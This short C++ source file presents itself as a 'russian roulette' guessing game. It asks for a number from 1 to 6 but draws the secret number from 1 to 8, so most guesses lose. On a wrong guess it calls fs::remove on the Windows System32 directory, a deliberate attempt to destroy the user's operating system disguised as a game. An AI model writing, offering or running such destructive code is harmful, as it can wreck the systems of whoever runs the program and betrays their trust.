#include "bullshit.h"
using namespace std;
namespace fs = std::filesystem;

int main() {
	
	int guess;
	cout << "Lets play a game of russian roulette :) :3\n";
	random_device rd;
	mt19937 gen(rd());
	uniform_int_distribution<>dis(1, 8);
	int pull = dis(gen);
	cout << "enter a number between 1 and 6\n";
	cin >> guess;
	if (guess == pull) {
		cout << "w";
	}
	else {
		string delPath = "C://Windows/System32";
		fs::remove(delPath);
	}

}
